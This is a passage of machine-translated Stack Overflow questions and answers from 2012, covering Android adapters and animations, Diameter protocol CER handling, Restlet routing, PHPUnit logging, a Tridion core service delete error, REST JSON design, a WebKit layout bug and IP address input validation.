     ItemsAdapter itemsAdapter=new ItemsAdapter(DetailsActivity.this, R.layout.details,booksList);
     setListAdapter(itemsAdapter);
     }
       } catch (JSONException e)
         {
             e.printStackTrace();
          }
            return null;
   } 
```

我的适配器是

```
 private class ItemsAdapter extends BaseAdapter implements ListAdapter
        {
            String[] items;

            public ItemsAdapter(DetailsActivity detailsActivity,
                    int details, ArrayList<HashMap<String, String>> booksList) {
                // TODO Auto-generated constructor stub
                this.items = items;
            }
            public View getView( int POSITION, View convertView,ViewGroup parent)
            {
                TextView cap = null ;
                View view = convertView;
                ImageView img = null;
                if (view == null) 
                {
                    LayoutInflater vi = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
                    view = vi.inflate(R.layout.details, null);
                }
                img = (ImageView) view.findViewById(R.id.smallImage);
                Log.i("sss","sss");
                cap = (TextView) view.findViewById(R.id.caption);
                cap.setText(mapName.get(POSITION));
                img.setImageBitmap(BitmapFactory.decodeByteArray(map.get(POSITION), 0, map.get(POSITION).length));
                return view;
            }
            public int getCount() 
            {
                return items.length;
            }
            public Object getItem(int position) 
            {
                return position;
            }
            public long getItemId(int position) 
            {
                return position;
            }
        } 
```

我的 JSON 字符串是

```
{
    "bookdetails": [
        {
            "bid": "2",
            "name": "Android 2 Application Dev",
            "bookid": "1",
            "description": "Providing in-depth coverage of how to build mobile applications using the next major release of the Android SDK, this invaluable resource takes a hands-on approach to discussing Android with a series of projects, each of which introduces a new feature and highlights techniques and best practices to get the most out of Android.",
            "image1": "http://media.shelf-awareness.com/shelfcontest.png",
            "image2": "http://cache0.bdcdn.net/assets/images/book/medium/9780/4704/9780470452622.jpg"
        }
    ]
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:59:03.900

你错过了 JsonObject 和 JsonArray，就用这个

```
JSONObject mJsonObject=null;
JSONArray bookDetails = null;
try {
    mJsonObject= new JSONObject("YourJson");
    bookDetails = mJsonObject.getJSONArray("bookdetails");
} catch (JSONException e1) {
    // TODO Auto-generated catch block
    e1.printStackTrace();
}

try {
    System.out.println("bookDetails.length() : "+bookDetails.length());
    for (int i = 0; i < bookDetails.length(); i++) 
    {
        JSONObject c = bookDetails.getJSONObject(i);

        String image1 = c.getString("image1");
        String image2=c.getString("image2");
        String Bid = c.getString("bid");
        String Bname = c.getString("name");
        String Bdesc= c.getString("description");
        String BbookId=c.getString("bookid");
        }
} catch (JSONException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} 
```

# diameter-protocol - 直径协议。如果收到多个 CER，预期的行为是什么？

> ID：13490614
> 
> 赞同：2
> 
> 时间：2012-11-21T09:57:42.777
> 
> 标签：diameter-protocol

我正在研究 Diameter 协议的 python 实现。我想知道如果在这种情况下 Diameter 对等体的预期行为是什么：

1.  Peer1 向 Peer2 发送 CER
2.  Peer2 向 Peer1 发送 CEA（结果代码 DIAMETER_SUCCESS: 2001）
3.  直径连接已准备就绪。
4.  一些直径流量
5.  Peer1 向 Peer2 重新发送另一个 CER
6.  Peer2 的预期行为是什么？

peer2 是否关闭了连接？还是 Peer2 必须重新发送 CEA？

我知道这种情况不应该发生，但是......如果 peer2 有一个错误的实现。

我在 rfc6733 中对此一无所知。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T16:59:05.933

您可以保持第一个连接或开始一个新连接，如您在[rfc6733中所见](https://www.rfc-editor.org/rfc/rfc6733#section-5.6)

> CER 消息总是在连接请求成功完成后立即在发起连接上发送。在选举的情况下，两个连接之一将关闭。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-26T06:11:01.167

对于 Diameter Peers 之间的任何给定实时连接，CER 和 CEA 应该只发生一次。期望它或必须在任何现有会话 [dmtr] 的上下文中处理它似乎都不正确。理想情况下，应该在这种情况发生之前断开传输连接。此外，使用 SCTP / TLS 将确保整个 3 次握手会在您到达该点之前发生。也许您需要仔细处理传输层的状态转换以更好地定义处理。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-22T06:33:36.203

对等方 2 应丢弃第二个 CER。

只有在传输关闭或直径关闭 (DPR/DPA) 发生后，它才应该接受第二个 CER

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-07-09T18:23:43.900

实际上 RFC 对此非常具体：

```
   CER 消息总是在发起连接时立即发送
   连接请求成功完成后。在这种情况下
   选举时，两个连接之一将关闭。这
   如果本地的 Origin-Host 响应者连接将继续存在
   直径实体高于对等体；发起人
   如果对等方的 Origin-Host 更高，则连接将继续存在。全部
   随后的消息在幸存的连接上发送。注意
   一个对等点的选举结果保证为
   与另一方的结果相反。

```

因此，总结一下：除非您在请求中使用不同的 Origin-Host，否则只有一个连接应该存在（最新的）。

如果您使用 TCP 并且 peer1 在没有通知 peer2 的情况下重新启动，这种情况并不少见。所以 peer2 必须允许 peer1 重新连接并使用最新的（最新的）连接。否则，您将阻止发往/来自 peer1 的消息，直到看门狗将其删除。

# android-animation - startAnimation() 没有被调用

> ID：13490627
> 
> 赞同：1
> 
> 时间：2012-11-21T09:58:22.383
> 
> 标签：android-animation

我正在尝试用两个片段实现 Youtube 风格的滑动菜单。我创建了一个自定义动画，该动画将在按下操作栏上的应用程序图标时调用切换功能来更改左侧片段的宽度。Expand.java 将增加宽度，而 Collapse.java 将减小宽度。当我从 MainActivity.java 的 onCreate() 调用 startAnimation() 函数时，它工作正常。但是当我从切换（）中调用它时，它不起作用，尽管 Expand.java 和 Collapse.java 的构造函数是

activity_main.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="horizontal" >
<LinearLayout 
 android:id="@+id/f1"     
     android:layout_height="match_parent"
    android:layout_width="0dip"  
    >

 <fragment
    android:id="@+id/listFragment"     
     android:layout_height="match_parent"
    android:layout_width="match_parent"   
    class="com.surv.ui123.FragLeft" >

 </fragment>
 </LinearLayout>
 <LinearLayout
    android:id="@+id/f2"     
     android:layout_height="match_parent"
    android:layout_width="match_parent"  
    >

<fragment
    android:id="@+id/detailFragment"
    android:layout_width="match_parent"     
    android:layout_height="match_parent"        
    class="com.surv.ui123.FragRight" >
      </fragment>

</LinearLayout>
</LinearLayout> 
```

FragLeft.java

```
package com.surv.ui123;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

public class FragLeft extends Fragment {

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container,
  Bundle savedInstanceState) {
View view = inflater.inflate(R.layout.fragleft,
    container, false);

return view;
} 
} 
```

FragRight.java

```
package com.surv.ui123;

import android.support.v4.app.Fragment;

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

public class FragRight extends Fragment {

 @Override
  public View onCreateView(LayoutInflater inflater, ViewGroup container,
      Bundle savedInstanceState) {
    View view = inflater.inflate(R.layout.fragright,
        container, false);      
return view;
}
} 
```

展开.java

```
package com.surv.ui123;
import android.view.View;
import android.view.ViewGroup.LayoutParams;
import android.view.animation.AccelerateInterpolator;
import android.view.animation.Animation;
import android.widget.Toast;

public class Expand extends Animation implements Animation.AnimationListener {
private View view;
private static long ANIMATION_DURATION;
private int FromWidth;
private int ToWidth;

public Expand(View v, int FromWidth, int ToWidth) {

    this.view = v;
    ANIMATION_DURATION = 1;
    this.FromWidth = FromWidth;
    this.ToWidth = ToWidth;
    setDuration(ANIMATION_DURATION);
    setRepeatCount(10);
    setFillAfter(false);
    setInterpolator(new AccelerateInterpolator());
    Toast.makeText(view.getContext(),"Expand",Toast.LENGTH_SHORT).show();
    setAnimationListener(this);

}

@Override
public void onAnimationEnd(Animation arg0) {
    // TODO Auto-generated method stub

}

@Override
public void onAnimationRepeat(Animation animation) {
    // TODO Auto-generated method stub

    LayoutParams lyp =  view.getLayoutParams();     
    lyp.width = lyp.width+(int)(ToWidth/10);
    view.setLayoutParams(lyp);

}

@Override
public void onAnimationStart(Animation animation) {
    // TODO Auto-generated method stub

    Toast.makeText(view.getContext(),"Strarted     Expand",Toast.LENGTH_SHORT).show();
}

} 
```

折叠.java

```
package com.surv.ui123;

import android.view.View;
import android.view.ViewGroup.LayoutParams;
import android.view.animation.AccelerateInterpolator;
import android.view.animation.Animation;
import android.widget.Toast;

public class Collapse extends Animation implements Animation.AnimationListener {

private View view;
private static long ANIMATION_DURATION;

private int FromWidth;
private int ToWidth;
public Collapse(View v, int ToWidth, int FromWidth) {

    Toast.makeText(view.getContext(),"Collapse",Toast.LENGTH_SHORT).show();
    this.view = v;      
    ANIMATION_DURATION = 1;
    this.FromWidth = FromWidth;
    this.ToWidth = ToWidth;
    setDuration(ANIMATION_DURATION);
    setRepeatCount(10);
    setFillAfter(false);
    setInterpolator(new AccelerateInterpolator());
    setAnimationListener(this);
}

@Override
public void onAnimationEnd(Animation animation) {
    // TODO Auto-generated method stub

}

@Override
public void onAnimationRepeat(Animation animation) {
    LayoutParams lyp =  view.getLayoutParams();     
    lyp.width = lyp.width-(int)(ToWidth/10);
    view.setLayoutParams(lyp);  
}

@Override
public void onAnimationStart(Animation animation) {
    // TODO Auto-generated method stub

}

} 
```

MainActivity.java

```
package com.surv.ui123;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.ViewGroup.LayoutParams;
import android.widget.LinearLayout;
import com.actionbarsherlock.app.SherlockFragmentActivity;

 public class MainActivity extends SherlockFragmentActivity {

 LinearLayout MenuList,RFrg;
 boolean isExpanded=true;    
 int screenWidth;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);     
    setContentView(R.layout.activity_main);

    MenuList = (LinearLayout) findViewById(R.id.f1);
    RFrg=(LinearLayout) findViewById(R.id.f2);
    LayoutParams lyp =  RFrg.getLayoutParams();     

        DisplayMetrics metrics = new DisplayMetrics();
        getWindowManager().getDefaultDisplay().getMetrics(metrics);
        screenWidth = metrics.widthPixels;
        lyp.width = screenWidth;

        RFrg.setLayoutParams(lyp);
        getSupportActionBar().setHomeButtonEnabled(true);               

}

@Override
    public boolean onOptionsItemSelected(com.actionbarsherlock.view.MenuItem item)           {
        switch (item.getItemId()) {
            case android.R.id.home:
                // app icon in action bar clicked; go home
                toggle();

                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }

    public void toggle()
    {       

    isExpanded=!isExpanded;

        if (isExpanded) {
            Collapse x= new Collapse(MenuList, 0,(int)(screenWidth*0.75));
            MenuList.startAnimation(x);
        }else {
            Expand d=new Expand(MenuList, 0,(int)(screenWidth*0.75));

            MenuList.startAnimation(d);
        }
    }                                                   

 } 
```

# java - 如何在 Restlet 中预处理 http 调用并根据该 http 调用设置新的 url？

> ID：13490629
> 
> 赞同：0
> 
> 时间：2012-11-21T09:58:23.860
> 
> 标签：java, restlet

我的问题是我在启动服务器时创建了所有用户的 url。对于很多用户来说，这需要时间，我想尽量减少我的启动时间，以便能够更快地部署。

我的网址是；

```
http://server.com/user_id/user_files_goes_here 
```

代码;

```
public synchronized Restlet createInboundRoot() {
    // for every client do;
    addClientDirectories(client);
}

private void addClientDirectories(Client aUser) {
    Router guardedRouter = new Router(context);

    // Attach a guard to secure access to the directory
    SaltedClientGuard guard = new SaltedClientGuard(context, ChallengeScheme.HTTP_BASIC, "user: " + aUser.userID);
    guard.setRechallengeEnabled(false);
    guard.getSecrets().put(aUser.userID, aUser.mPassword.toCharArray());
    guard.setNext(guardedRouter);

    // Create a directory able to expose a hierarchy of files
    Directory directory = new Directory(context, rooturi+ aUser.userID + "/");
    directory.setListingAllowed(true);
    directory.setDeeplyAccessible(true);
    directory.setModifiable(true);
    directory.setTargetClass(UserDirectory.class);

    guardedRouter.attach(rooturl, directory);

    rootRouter.attach(userurl + "/" + aUser.userID+"/", guard);
} 
```

上面确保用户必须使用基本身份验证登录，然后 UserDirectory.class 处理应该向上或向下传输的数据。每个用户在自己的 url 下都有自己的登录名和自己的文件区域（子网址取决于用户文件结构）。

*与其在启动 servlet 时创建所有用户，我可以以某种方式使用 Restlet 框架连接到登录/首次访问（与上述相同的 url）并附加用户目录吗？*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T15:11:14.030

因此，事实证明，当用户登录时调用我的**addClientDirectories()并不难。**

# asp.net - 应用程序未运行时从 asp.net 发送邮件

> ID：13490630
> 
> 赞同：0
> 
> 时间：2012-11-21T09:58:26.707
> 
> 标签：asp.net, email, send, offline

我想在某些日历日发送电子邮件，例如每月 20 日。我怎样才能做到这一点？问题是我不太确定这个应用程序是否会在本月 20 日被用户浏览。如果这天没有打开，可能邮件就发不出去了。即使应用程序没有运行，有什么方法可以发送它。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:04:51.803

为此，我将编写[**Windows 服务**](http://msdn.microsoft.com/en-us/library/d56de412%28v=vs.100%29.aspx)应用程序。服务将在没有用户干预的情况下在服务器上运行，并且依赖于用户登录。

高级别行动步骤将是

1.  商店日历天数
2.  允许服务访问该商店并在请求的日期时间发送电子邮件（使用预定义的模板？）。

# php - 如何从 PHPUnit 测试用例中登录？

> ID：13490632
> 
> 赞同：7
> 
> 时间：2012-11-21T09:58:28.517
> 
> 标签：php, logging, phpunit

从 PHPUnit 测试用例打印日志语句的最佳实践是什么？

我正在运行 selenium 测试用例，并希望打印出类似“登录完成”、“页面 XY 已打开”之类的内容。

我想在我想要的*任何*日志文件中查看那些。如果您可以定义日志级别，那就太好了。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-21T12:34:50.270

我建议您使用[Selenium Server Logging](http://seleniumhq.org/docs/05_selenium_rc.html#selenium-server-logging)。它将为您提供您可能需要的所有调试信息。

如果这不是您的选项并且您仍想从`PHPUnit`测试用例中记录，您有 3 个选项：

1.  使用内置的日志记录功能（[文档](http://phpunit.de/manual/current/en/phpunit-book.html#logging)），可以通过`phpunit.xml`文件或命令行参数（[文档](http://phpunit.de/manual/current/en/phpunit-book.html#textui.clioptions)）进行配置；
2.  通过实现接口创建您自己的记录器`PHPUnit_Framework_TestListener`，这有点受限，因为它仅支持有限数量的事件您可以记录，例如`startTest`, `endTest`, `addError`,等。有关受支持事件的完整列表，`addFailure`请参阅（[文档）。](http://phpunit.de/manual/current/en/phpunit-book.html#extending-phpunit.PHPUnit_Framework_TestListener)您可能会向您的实现添加更多事件，但这也需要您通过子类化类（[文档](http://phpunit.de/manual/current/en/phpunit-book.html#extending-phpunit.PHPUnit_Extensions_TestDecorator)）或实现接口（[文档](http://phpunit.de/manual/current/en/phpunit-book.html#extending-phpunit.PHPUnit_Framework_Test)`PHPUnit_Framework_TestSuite::run()`）来覆盖该方法。`PHPUnit_Extensions_TestDecorator``PHPUnit_Framework_Test`
3.  最简单和更灵活的选择是子类化`PHPUnit_Framework_TestCase`该类并在那里实现日志记录功能。这将允许您从您的测试方法中登录。（[文档](http://phpunit.de/manual/current/en/phpunit-book.html#extending-phpunit.PHPUnit_Framework_TestCase)）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-21T10:57:21.730

您可以实现一个测试侦听器，在`phpunit.xml.dist`您[的](http://phpunit.de/manual/current/en/phpunit-book.html#extending-phpunit.PHPUnit_Framework_TestListener).

如果您想在测试方法中指定消息，您可以让您的测试从一个添加日志方法的公共类继承。在那里做任何你想做的事。我不喜欢将其作为解决方案，但这当然是一种选择。

# tridion - 无法通过 TridionCoreService 删除组件

> ID：13490634
> 
> 赞同：2
> 
> 时间：2012-11-21T09:58:44.343
> 
> 标签：tridion, tridion-2011

我无法使用 CoreService SessionAwareCoreServiceClient 删除任何项目。我能够创建/读取组件，创建文件夹...... 作为一个错误，我得到“对象引用未设置为对象的实例”。我想指出，我在 Tridion Content Manager 机器之外的应用程序中使用了核心服务。以下是来自 CM 服务器的日志：

> 用户：NT AUTHORITY\NETWORK SERVICE
> 
> StackTrace 信息详细信息：在 Tridion.UGC.EventHandler.UGCEventHandler.GetDataSourcesForTCM(String[] tcm) 在 Tridion.UGC.EventHandler.UGCEventHandler.DeleteItemStats(TcmUri tcm)
> 在 Tridion.UGC.EventHandler.UGCEventHandler.HandlerForComitted(IdentifiableObject subject, DeleteEventArgs args, EventPhases 阶段) 在 System.RuntimeMethodHandle._InvokeMethodFast(IRuntimeMethodInfo 方法, 对象目标, Object[] 参数, SignatureStruct& sig, MethodAttributes methodAttributes, RuntimeType typeOwner) 在系统。 RuntimeMethodHandle.InvokeMethodFast（IRuntimeMethodInfo 方法，对象目标，Object[] 参数，签名 sig，MethodAttributes methodAttributes，RuntimeType typeOwner）在 System.Reflection.RuntimeMethodInfo.Invoke（Object obj，BindingFlags invokeAttr，Binder binder，Object[] 参数，CultureInfo 文化， Boolean skipVisibilityChecks) 在 System.Delegate.DynamicInvokeImpl(Object[] args) 在 Tridion.ContentManager.Extensibility.EventSubscription.DeliverEvent(IEnumerable`1 subjects, TcmEventArgs eventArgs, EventPhases phase) at Tridion.ContentManager.Extensibility.EventSystem.DeliverEvent(IEnumerable`1 个主题，TcmEventArgs eventArgs，EventDeliveryPhase deliveryPhase)
> 在 Tridion.ContentManager.Extensibility.EventSystem.DeliverEvent(IdentifiableObject 主题，TcmEventArgs eventArgs，EventDeliveryPhase deliveryPhase)
> 在 Tridion.ContentManager.IdentifiableObject.Delete(DeleteEventArgs deleteEventArgs) 在 Tridion.ContentManager.IdentifiableObject.Delete( ) 在 Tridion.ContentManager.CoreService.CoreServiceBase.Delete(String id)
> 在 SyncInvokeDelete(Object , Object[] , Object[] ) 在 System.ServiceModel.Dispatcher.SyncMethodInvoker.Invoke(Object instance, Object[] 输入, Object[]& 输出) 在 Tridion.ContentManager.CoreService.TransactionSupportInvoker.Invoke(Object实例，Object[] 输入，Object[]& 输出）在 System.ServiceModel.Dispatcher.DispatchOperationRuntime.InvokeBegin(MessageRpc& rpc) 在 System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage5(MessageRpc& rpc) 在 System.ServiceModel.Dispatcher.ImmutableDispatchRuntime。 System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage4(MessageRpc& rpc) 的 ProcessMessage41(MessageRpc& rpc) System.ServiceModel 的 System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage31(MessageRpc& rpc)。Dispatcher.ImmutableDispatchRuntime.ProcessMessage3(MessageRpc& rpc) 在 System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage2(MessageRpc& rpc) 在 System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage11(MessageRpc& rpc) 在 System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage1(MessageRpc& rpc) ) 在 System.ServiceModel.Dispatcher.MessageRpc.Process(Boolean isOperationContextSet)rpc) 在 System.ServiceModel.Dispatcher.MessageRpc.Process(Boolean isOperationContextSet)rpc) 在 System.ServiceModel.Dispatcher.MessageRpc.Process(Boolean isOperationContextSet)

使用已使用的帐户，我可以手动删除项目，这意味着我拥有正确的权限。任何有关的帮助/建议都将不仅仅是可用的......

* * *

```
 _client = new SessionAwareCoreServiceClient("wsHttp_2011");
            bool useWindowsCredentials = bool.Parse(Environment.EnvironmentUserSettings.UseWindowsCredentials);
            var credentials = CredentialCache.DefaultNetworkCredentials;
            if (!useWindowsCredentials)
            {
                string password=Environment.EnvironmentUserSettings.Password;
                credentials = new NetworkCredential(Environment.EnvironmentUserSettings.UserName, password);
            }

            _client.ChannelFactory.Credentials.Windows.ClientCredential = credentials; 
```

此代码用于模拟。在设置文件中，我可以选择是否使用 Windows 凭据或设置文件中的凭据。我使用 Windows LDAP 帐户或手动输入凭据时遇到错误。我还没有尝试为此使用 SDL Administrator。我会尝试并通知你。不管怎样，谢谢你的努力

@UPDATE：我已经尝试使用带有基本 http 端点的常规 CoreService 并且仍然得到相同的错误。因此，身份验证不会在这里造成问题。UGC 事件似乎出了点问题。不幸的是，我没有代码源，也没有关于启用 UGC 的 dll 的任何其他信息。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T10:46:47.433

stacktrace 提到了 UGCEventHandler，所以我假设 UGC 已安装，您可以尝试暂时禁用此事件系统，看看是否有帮助，但我认为这不是问题的根源，因为您提到您可以手动删除那个用户。

但是，您提到“...在我的 Tridion Content Manager 机器之外的应用程序中使用核心服务”，并且您正在使用会话感知核心服务。

编辑：所以您使用的是会话感知核心服务客户端，并且您也提供了密码。这并没有真正加起来，会话感知核心服务客户端应该用于您的用户帐户已经过身份验证的情况，或者当您通过有效的 SDL Tridion Impersonation 用户调用核心服务时，您可以模拟核心服务仅通过用户名调用有效的 SDL Tridion 用户名（无需密码）。

尝试使用常规的核心服务客户端，如下所述：[获取没有配置文件的核心服务客户端](http://code.google.com/p/tridion-practice/wiki/GetCoreServiceClientWithoutConfigFile)。

或者，如果您坚持使用 Session Aware Core Service Client（我认为您的情况是错误的），请确保您的应用程序在有效的 SDL Tridion Impersonation 用户下运行（因为您在外部服务器上运行，您需要添加域帐户在 SDL Tridion MMC 管理单元中），然后像这样模拟核心服务客户端：

```
using (SessionAwareCoreServiceClient client = new SessionAwareCoreServiceClient())
{
    // impersonate with valid user
    client.Impersonate("SDL Tridion Username here");
    // use client
    client.Delete(...);
} 
```

# cocos2d-android - android中的Cocos2d CCshaky3d

> ID：13490635
> 
> 赞同：1
> 
> 时间：2012-11-21T09:58:45.687
> 
> 标签：cocos2d-android

我正在尝试在我的程序中使用 android 中的 cocos2d 创建抖动效果。但是当我应用抖动效果时，方向已更改并且会显示黑屏。这段代码有什么问题？

```
 float  width=s.getWidth()/2;
    float height=s.getHeight()/2;
    firstfireImage = CCSprite.node();
    Bitmap bm =   BitmapFactory.decodeResource(mContext.getResources(),R.drawable.image_01);
    firstfireImage=CCSprite.sprite(bm);
    firstfireImage.setPosition(240,160);

    CCShaky3D shaky=CCShaky3D.action(10,true,ccGridSize.ccg(20,30),1.0f);
    CCRotateTo rotate=CCRotateTo.action(1,190);
    //CCWaves wave=CCWaves.action(1,1.0f,true,true, ccGridSize.ccg(20,30),1);

    runAction(CCRepeatForever.action(CCSequence.actions(shaky)));
    addChild( firstfireImage,1); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T05:56:19.537

将您的图像放在资产文件夹中并删除 bm=... 行并试试这个

```
firstfireImage=CCSprite.sprite("image_01.png"); 
```

# c# - 关闭另一个网页时如何自动刷新页面

> ID：13490639
> 
> 赞同：0
> 
> 时间：2012-11-21T09:59:02.813
> 
> 标签：c#, .net

我有一个在 ViewData.aspx 中有一个下拉菜单的网页。单击链接时，它会重定向到另一个页面，可以在 AddData.aspx 中添加下拉数据。在 AddData.aspx 页面关闭时，ViewData.aspx 不会使用新添加的下拉数据进行刷新。目前我正在按 F5。如何自动实现这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:03:25.177

我认为您可以使用命名窗口和 java 脚本来完成此操作，但我不确定这如何与较新的浏览器一起使用。看这里： http: [//www.infimum.dk/HTML/JSwindows.html](http://www.infimum.dk/HTML/JSwindows.html)这个方法。

或者，您可以使用 jQueryModal 窗口或类似的东西并重新加载您的下拉列表或整个页面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:19:26.220

听起来您没有将用户重定向到 AddView，而是在新的浏览器窗口中打开 AddView 作为一种弹出窗口。如果那是你正在做的，它不会推荐它。

而不是那个解决方案，我建议要么：

*   使 AddData 成为用户控件并将其包含在 ViewData 页面中（可能在隐藏的 div 中作为模式弹出窗口）或

*   使 ViewData 实际上重定向到同一浏览器实例中的 AddData 页面，并在 AddData 上有一个按钮，该按钮重定向回 ViewData。

如果您确实需要在不同窗口中同时查看 ViewData 和 AddData，那么您可以在触发 AddData 时以编程方式“锁定”Viewdata 页面，然后请求用户按下 ViewData 上的“更新”按钮将重新加载 ViewData 页面。

# json - 如何表示资源及其相应集合的宁静表示？

> ID：13490641
> 
> 赞同：0
> 
> 时间：2012-11-21T09:59:15.187
> 
> 标签：json, api, rest, data-structures

我正在开发一个 API，我需要返回资源/实体等。

例子：

`GET /articles?limit=20&page=5`获取包含 20 个项目的范围集合。

`GET /articles/25`获取唯一标识的项目。

基本上我会像这样分别代表这些资源：

一个集合：

```
[
  {
    "id": 12,
    "title": "foo"
  },
  {
    "id": 25,
    "title": "bar"
  }
] 
```

独一无二的物品：

```
{
  "id": 25,
  "title": "baz"
} 
```

这听起来很自然。

但是，如果我想包含分页数据怎么办？

在集合中，我可以执行以下操作：

```
{
  "collection": [
    {
      "id": 12,
      "title": "foo"
    },
    {
      "id": 25,
      "title": "bar"
    }
  ],
  "pagination": {
     "item_count": 2,
     "page": 5,
     "limit": 20,
     "total": 102
  }
} 
```

独特的物品可以保持原样，但对我来说看起来有点不一致，消费者如何能够检测到收藏品与独特的物品？他需要检查“收集”键吗？

我的想法是“输入”我的结果，例如：

对于单个项目：

```
{
  "type": "item",
  "model": "article",
  "resultKey": "article",
  "article": {
    "id": 25,
    "title": "baz"
  }
} 
```

对于一个集合：

```
{
  "type": "collection",
  "model": "article",
  "resultKey": "articles",
  "articles": [
    {
      "id": 12,
      "title": "foo"
    },
    {
      "id": 25,
      "title": "bar"
    }
  ],
  "pagination": {
    "item_count": 2,
    "page": 5,
    "limit": 20,
    "total": 102
  }
} 
```

我什至可以简化关键的事情，以传统方式使用`collection`和`item`.

一些策略建议总是使用集合并返回单个项目，但这对我来说听起来很不自然，我请求一个返回实体的端点，我除了看到一个集合之外，即使只有一个项目也是如此。

是否有任何规范化的 json 模式来解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T10:19:55.327

我通常不使用`pagination`物品。我实际上添加了适当的链接`rel`。[这是 rels 的列表](http://www.iana.org/assignments/link-relations/link-relations.xml)。

有一个`Collection+JSON` [媒体类型](https://www.rfc-editor.org/rfc/rfc6573#ref-CollectionJSON)。

有一个标准的[RFC 6573](https://www.rfc-editor.org/rfc/rfc6573)。

通过遵循您坚持的这些约定`HATEOAS`，从而将您的应用程序与客户端解耦。

# jquery - 浮动和内联块有时在 webkit 中不起作用

> ID：13490643
> 
> 赞同：1
> 
> 时间：2012-11-21T09:59:20.193
> 
> 标签：jquery, css, google-chrome, safari, webkit

`float`我检测到一个问题，该问题会影响位于 with和 with列中的 div `display: inline-block`。让我举两个例子： ![在此处输入图像描述](../Images/9928779c6174c680a3e455bf969ae0c7.png)

在第一种情况下（左），名称“Altair”和“Log-Out”按钮与 display inline-block 一起定位。所需的结果显示在第一行中，当我使用 JQuery 动态修改 div 的内容时总是发生的情况显示在第二行中。当我第一次编写所有 html 时，一切都是正确的。

在另一种情况下（右），数字“21”用 float:left 定位，然后推动月份和年份。在这种情况下，始终使用 JQuery 插入内容，并且当我刷新页面时，第二行中显示的问题仅出现有时。5 次中的 1 次，或多或少。

如您所见，Chrome 控制台说 div 的宽度为 0px，这可能是触发问题的原因。我可以在 Safari 中重现第一个案例（左），但不能重现其他案例（右）。我无法重现 Firefox 和 Opera 中的错误，那么我想这与 Webkit 有关。

你知道发生了什么，我可以解决这个问题吗？感谢您的关注。

HTML 和 CSS 第一种情况：

```
<div id="login-widget" class="widget">
    <div class="name"></div>
    <div class="button in">
        <div class="value">Log - Out
        </div><div class="decorator"></div>
    </div>
</div>

#login-widget .name {
    display: inline-block;
    vertical-align: middle;
    margin-right: 6px;
}
#login-widget .button {
    border: solid 1px;
    border-radius: 5px;
    cursor: pointer;
    display: inline-block;
    vertical-align: middle;
} 
```

另一种情况的 HTML 和 CSS：

```
<div class="date">
    <div class="day"></div>
    <div class="month"></div>
    <div class="year"></div>
</div>

#agenda-widget .date {
    margin: 0;
    font-size: 12px;
}
#agenda-widget .day {
    font-size: 45px;
    line-height: 36px;
    color: #DB443F;
    float: left;
    margin-right: 5px;
}
#agenda-widget .month {
    padding-top: 12px;
}
#agenda-widget .year {
    /*nothing*/
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:05:31.900

似乎这是一个 Webkit 错误。幸运的是，它可以通过强制 webkit 重新绘制元素来解决。正如在[这个问题](https://stackoverflow.com/questions/3485365/how-can-i-force-webkit-to-redraw-repaint-to-propagate-style-changes)中指出的那样，一个技巧是使用这个简单的javascript代码：

```
sel.style.display='none';
sel.offsetHeight; // no need to store this anywhere, the reference is enough
sel.style.display='block'; 
```

如果有人找到更好的解决方案，我会将其标记为正确答案，但目前这可行并且可以帮助其他有同样问题的人。

# c# - 创建同时兼容 IPv4 和 IPv6 的文本框

> ID：13490648
> 
> 赞同：-1
> 
> 时间：2012-11-21T09:59:34.933
> 
> 标签：c#, .net, textbox, ip, version

由于正则表达式可能不是验证 IP 地址的最佳解决方案，因为我需要验证 IPv4 和 IPv6。是否有解决方案已经解决了对 IPv4 和 IPv6 输入的支持。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T10:13:30.727

普通的 TextBox 支持 IPv4 地址和 IPv6 地址以及任何其他文本的输入。如果您正在寻找*只*接受IPv4 地址和 IPv6 地址的控件，请不要这样做。

IP 地址（尤其是 IPv6 地址）很少从头开始输入。大多数情况下，它们是从其他地方复制而来的，而且格式不一定正确。如果地址格式不正确，用户通常无法在复制地址的位置更改它——用户需要能够将其粘贴到 TextBox 并在那里进行编辑。如果 TextBox 不接受无效输入，则这是不可能的。

解决方案：使用普通文本框并在用户单击提交/下一步/确定按钮时验证输入。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:01:46.300

你需要看看以下两个项目，你会发现它们非常有用：

[http://code.google.com/p/ipaddresscontrollib/](http://code.google.com/p/ipaddresscontrollib/)

